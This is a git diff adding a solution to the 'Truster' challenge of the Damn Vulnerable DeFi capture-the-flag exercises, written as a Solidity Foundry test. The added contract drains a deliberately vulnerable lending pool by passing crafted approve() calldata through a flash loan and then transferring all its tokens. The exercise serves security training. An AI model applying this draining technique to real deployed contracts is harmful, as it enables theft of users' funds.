@@ -6,6 +6,24 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract TrusterExploit {
+    TrusterLenderPool public pool;
+    DamnValuableToken public token;
+    address public recovery;
+
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
+        // Prepare the calldata to approve this contract to spend the pool's tokens
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), _token.balanceOf(address(_pool)));
+
+        // Execute the flash loan with the crafted calldata
+        _pool.flashLoan(0, address(this), address(_token), data);
+
+        // Transfer the approved tokens to the recovery account
+        _token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
+    }
+
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -51,7 +69,8 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // Deploy and exploit the vulnerability
+        new TrusterExploit(pool, token, recovery);
     }
 
     /**
